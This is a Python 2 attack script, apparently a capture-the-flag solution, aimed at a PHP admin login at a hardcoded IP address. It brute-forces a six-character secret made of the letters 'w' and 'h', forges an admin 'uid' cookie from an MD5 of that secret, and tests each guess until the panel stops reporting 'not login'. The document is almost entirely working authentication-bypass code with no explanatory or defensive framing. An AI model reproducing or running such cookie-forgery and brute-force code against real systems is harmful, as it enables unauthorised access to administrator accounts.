import requests
import re
import itertools
import random
import hmac
import hashlib
import sys
import string
rand = 'wh'
get_token = "http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&mode=login"
test_cookie = "http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&mode=index"

def get_csrf_token(res):
    rex = re.search(r'\S*<input type="hidden" name="TOKEN" id="password" value="(\w*)">', res.content)
    print rex.group(1)
    return rex.group(1)


def test_token(s,screat,phpsessionid):

 # _cookie=s.cookies
 # requests.utils.add_dict_to_cookiejar(_cookie,{"uid":"admin%7c"+hash_hmac(screat)})

    s.headers['cookie']=""
    s.headers['Cookie']="uid=admin%7c"+hash_hmac(screat)+"; "+phpsessionid


    res=s.get(test_cookie)
    if res.content.find("not login")<0:
        print "key",screat
        print "cookies",s.headers['Cookie']
        return True
    else:
        print "key:",screat,"failed!"
        return False


def hash_hmac(data):
    hash=hashlib.md5()
    hash.update(data+"admin")
    # h = hmac.new(key, data, hashlib.md5)
    return hash.hexdigest()

def rand_str(length):
    return ''.join(random.choice(string.letters + string.digits) for _ in range(length))

def calc_maybe(lst):
    prd = []
    for i in lst:
        prd.append((i, i+1))
    return itertools.product(*prd)


flag = True
while flag:
    rand_lst = []
    s = requests.session();
    s.headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51"
                      ".0.2704.63 Safari/537.36"
    }


    s.headers['Cookie'] = "PHPSESSID={};".format(rand_str(26))
    phpsessionid=s.headers['Cookie']
    for i in range(2):
        for j in range(2):
            for k in range(2):
                for l in range(2):
                    for m in range(2):
                        for n in range(2):
                            secret = rand[i]+rand[j]+rand[k]+rand[l]+rand[m]+rand[n]
                            if test_token(s, secret, phpsessionid):
                                flag = False
                                break
                    if flag ==False:
                        break
                if flag == False:
                    break
            if flag == False:
                break
        if flag == False:
            break
    if flag == False:
        break